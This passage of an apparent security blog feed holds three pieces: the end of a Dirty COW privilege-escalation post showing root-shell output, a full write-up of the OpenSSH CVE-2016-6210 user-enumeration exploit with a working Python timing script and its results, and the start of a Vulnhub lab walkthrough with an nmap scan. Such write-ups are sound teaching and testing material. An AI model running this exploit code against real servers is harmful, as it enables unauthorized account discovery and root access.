&lt;span class="code-line"&gt;&lt;span class="n"&gt;Racing&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;may&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;take&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;overwritten&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Popping&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Don&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;forget&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;restore&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bak&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;thread&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;stopped&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;thread&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;stopped&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;root@computer_name dirtycow&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;maggick&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;maggick&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And we got root privileges as planned. The exploit replace the
&lt;code&gt;/usr/bin/passwd&lt;/code&gt; executable so we need to restore it with the one in
&lt;code&gt;/tmp/bak&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;In order to correct this vulnerability we just need to upgrade our kernel.&lt;/p&gt;</content><category term="security"></category><category term="cve"></category><category term="security"></category><category term="exploit"></category></entry><entry><title>CVE 2016-6210 OpenSSHD user enumeration</title><link href="https://maggick.fr/2016/07/cve-2016-6210-opensshd-user-enumeration.html" rel="alternate"></link><published>2016-07-23T08:45:00+02:00</published><updated>2016-07-23T08:45:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-07-23:/2016/07/cve-2016-6210-opensshd-user-enumeration.html</id><summary type="html">&lt;p&gt;The 13th if July a new wild CVE appeared (Yes, Pokemon Go is still a buzz for
the moment).&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6210"&gt;CVE 2016-6210&lt;/a&gt;
allow a user enumeration on an SSH server by comparing request time between non
existing user and allowed ones.
This vulnerability target  OpenSSHD with a version of 7.2p2 or inferior.&lt;/p&gt;
&lt;p&gt;That means with a good dictionary you may know which user are
present on the server with an SSH access.&lt;/p&gt;
&lt;p&gt;This post just demonstrate how to exploit this vulnerability with a simple
example.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;The 13th if July a new wild CVE appeared (Yes, Pokemon Go is still a buzz for
the moment).&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6210"&gt;CVE 2016-6210&lt;/a&gt;
allow a user enumeration on an SSH server by comparing request time between non
existing user and allowed ones.
This vulnerability target  OpenSSHD with a version of 7.2p2 or inferior.&lt;/p&gt;
&lt;p&gt;That means with a good dictionary you may know which user are
present on the server with an SSH access.&lt;/p&gt;
&lt;p&gt;This post just demonstrate how to exploit this vulnerability with a simple
example.&lt;/p&gt;


&lt;h2 id="opensshd-72p2-user-enumeration"&gt;OpenSSHD &amp;lt;= 7.2p2 - User Enumeration&lt;/h2&gt;
&lt;p&gt;A tiny python script is present on
&lt;a href="https://www.exploit-db.com/exploits/40113/"&gt;exploit-db&lt;/a&gt;. I had to modify it a
bit in order to pass the username in parameter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span class="normal"&gt; 1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt; 2&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt; 3&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt; 4&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt; 5&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt; 6&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt; 7&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt; 8&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt; 9&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;10&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;11&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;12&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;13&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;14&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;15&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;16&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="normal"&gt;17&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/python&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;paramiko&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;25000&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SSHClient&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;starttime&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;clock&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_missing_host_key_policy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AutoAddPolicy&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;         &lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.4.231&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;         &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;         &lt;span class="n"&gt;endtime&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;clock&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;endtime&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;starttime&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;The script will simply try to connect to &lt;code&gt;192.168.4.231&lt;/code&gt; with the user passed in
parameter and a password of 25 000 'A' and measure the time of the connection.&lt;/p&gt;
&lt;p&gt;We create a simple list of possible user with a non existing user to be able to
compare connection times.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@computer_name tmp&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;nonExistsingUserForSure&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;john&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nf"&gt;max&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ssh_user&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We launch the script against our test server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@computer_name tmp&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;read&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;nonExistsingUserForSure&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.17941999999999997&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;john&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.18687900000000002&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;root&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.18173099999999998&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;bob&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.178726&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.23088699999999995&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;alice&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.13389600000000002&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nf"&gt;max&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.17069700000000004&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;ssh_user&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.24780699999999997&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can easily see that SSH root login is disallowed, and that the user &lt;code&gt;user&lt;/code&gt;
and &lt;code&gt;ssh_user&lt;/code&gt; are allowed to connect to the server using SSH.&lt;/p&gt;
&lt;p&gt;As often with brute force, the major issue will be to build the dictionary but
some tools like &lt;a href="https://github.com/digininja/CeWL"&gt;CeWL&lt;/a&gt; from digininja can
help build it.&lt;/p&gt;</content><category term="security"></category><category term="cve"></category><category term="security"></category><category term="exploit"></category></entry><entry><title>Vulnhub SecTalks: BNE0x03 - Simple</title><link href="https://maggick.fr/2016/05/vulnhub-sectalks-bne0x03-simple.html" rel="alternate"></link><published>2016-05-11T19:55:00+02:00</published><updated>2016-05-11T19:55:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-05-11:/2016/05/vulnhub-sectalks-bne0x03-simple.html</id><summary type="html">&lt;p&gt;&lt;img alt="Simple homepage" class="align-left" src="/media/2016.05/simple1.png" width="162"/&gt;&lt;/p&gt;
&lt;p&gt;As droopy was not really hard and doesn't contain as much web vulnerability as I
would hope for, I tried an other VM
&lt;a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/"&gt;SecTalks: BNE0x03 - Simple&lt;/a&gt;
There were also hints on the description of the machine but with my resolution
they do not appear when just browsing the main page of vulnhub so I have not
spoiled myself with the hints this time.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.05/simple1.png" alt="Simple homepage" width="162"&gt;&lt;/p&gt;
&lt;p&gt;As droopy was not really hard and doesn't contain as much web vulnerability as I
would hope for, I tried an other VM
&lt;a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/"&gt;SecTalks: BNE0x03 - Simple&lt;/a&gt;
There were also hints on the description of the machine but with my resolution
they do not appear when just browsing the main page of vulnhub so I have not
spoiled myself with the hints this time.&lt;/p&gt;


&lt;h2 id="discovery"&gt;Discovery&lt;/h2&gt;
&lt;p&gt;Let's nmap the box to get some knowledge about it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@kalili&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;65535&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Starting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;7.12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CEST&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Nmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.00032&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;latency&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ow"&gt;Not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;shown&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;65535&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;closed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ports&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="k"&gt;STATE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SERVICE&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;open&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;MAC&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;Address&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Oracle&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VirtualBox&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;virtual&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;NIC&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
